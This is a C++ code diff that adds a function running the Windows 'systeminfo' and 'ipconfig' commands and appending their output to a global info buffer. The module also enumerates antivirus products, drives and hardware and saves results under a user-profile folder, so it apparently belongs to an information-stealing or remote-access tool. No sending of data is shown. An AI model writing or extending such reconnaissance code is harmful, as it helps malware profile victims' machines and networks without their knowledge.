@@ -89,6 +89,8 @@ void Drives();
 
 void Antivirus();
 
+void CmdSysInfo();
+
 std::string GetCPUType();
 
 std::string GetWindowsOSType();
@@ -100,6 +102,7 @@ void cursystem::GetSysInfo()
 	std::string mainPath = "C:/Users/" + func::GetUser() + config::path + "/System-Info/System-Info.txt";
 
 	GetGeneralInfo();
+	CmdSysInfo();
 	CPU();
 	GPU();
 	RAM();
@@ -207,6 +210,7 @@ void GetGeneralInfo()
 
 }
 
+
 std::string GetWindowsOSType() {
 
 	float ret = 0.0f;
@@ -221,6 +225,35 @@ std::string GetWindowsOSType() {
 	}
 	return "Windows " + std::to_string(ret);
 
+}
+
+void CmdSysInfo()
+{
+	std::string commands[] = { "systeminfo", "ipconfig"};
+	std::string output = "\nsysteminfo\n```\n";
+	FILE* pipe = _popen(commands[0].c_str(), "r");
+	if (pipe)
+	{
+		char buffer[128];
+		while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
+		{
+			output += buffer;
+		}
+		_pclose(pipe);
+	}
+	output += "```\n\nipconfig\n```\n";
+	pipe = _popen(commands[1].c_str(), "r");
+	if (pipe)
+	{
+		char buffer[128];
+		while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
+		{
+			output += buffer;
+		}
+		_pclose(pipe);
+	}
+	output += "```\n";
+	global::info += output;
 }
 
 void CPU()
@@ -559,3 +592,4 @@ void Antivirus()
 	}
 
 }
+
